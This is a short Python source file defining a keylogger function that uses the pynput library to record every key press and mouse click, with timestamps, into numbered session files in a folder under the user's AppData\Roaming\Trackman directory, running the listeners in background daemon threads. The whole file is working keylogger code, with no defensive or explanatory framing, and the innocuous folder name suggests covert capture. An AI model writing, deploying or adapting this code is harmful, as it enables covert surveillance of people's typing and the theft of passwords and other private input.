import os
import pynput.keyboard
import pynput.mouse
import time
import threading

def run_keylogger():
    keylog_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Trackman", "keys")
    if not os.path.exists(keylog_folder):
        os.makedirs(keylog_folder)

    session_number = 1
    session_filename = os.path.join(keylog_folder, f"session{session_number}.txt")
    while os.path.exists(session_filename):
        session_number += 1
        session_filename = os.path.join(keylog_folder, f"session{session_number}.txt")

    with open(session_filename, "w") as f:
        f.write(f"Keylogger session started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    def on_press(key):
        try:
            key_str = str(key.char)
        except AttributeError:
            key_str = str(key)
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with open(session_filename, "a") as f:
            f.write(f"[{timestamp}] Key Pressed: {key_str}\n")

    def on_click(x, y, button, pressed):
        if pressed:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            with open(session_filename, "a") as f:
                f.write(f"[{timestamp}] Mouse Pressed at ({x}, {y}) with {button}\n")

    listener_keyboard = pynput.keyboard.Listener(on_press=on_press)
    listener_mouse = pynput.mouse.Listener(on_click=on_click)

    keyboard_thread = threading.Thread(target=listener_keyboard.start)
    mouse_thread = threading.Thread(target=listener_mouse.start)

    keyboard_thread.daemon = True
    mouse_thread.daemon = True

    keyboard_thread.start()
    mouse_thread.start()
